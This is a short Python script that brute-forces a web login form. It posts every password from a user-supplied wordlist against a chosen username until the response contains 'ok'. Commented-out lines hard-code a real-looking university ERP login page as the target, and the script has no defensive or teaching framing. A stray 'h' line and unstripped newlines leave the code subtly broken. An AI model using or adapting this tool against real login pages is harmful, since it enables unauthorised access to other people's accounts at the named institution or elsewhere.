import requests
h
#url of the page 
url = input("[+] Input url of the login page ")

#taking username
username = input("[+]]Enter username ")

#taking wordlist directory
wordlists_path = input("[+]Specify the name or loacation of your wordlists ")


#url = 'https://erp.gctu.edu.gh/sip/auth/login.php'

#reading wordlist file
with open(wordlists_path) as wordlists:
    for passwd in wordlists:
        data = {'username':username, 'password':passwd}
        r = requests.post(url, data=data)
        if 'ok'.encode() in r.content:
            print("Password found:%s" %(passwd))
            break
        else:
            print("checking %s with username:%s and password:%s" %(url, username, passwd) )

'''
    data = {'username':username,'password':passwd}
    r = requests.post('https://erp.gctu.edu.gh/sip/auth/login.php', data = data)
    if 'ok'.encode() in r.content:
        print("Password found")
    else:
        print("Checking password %s" % passwd)
'''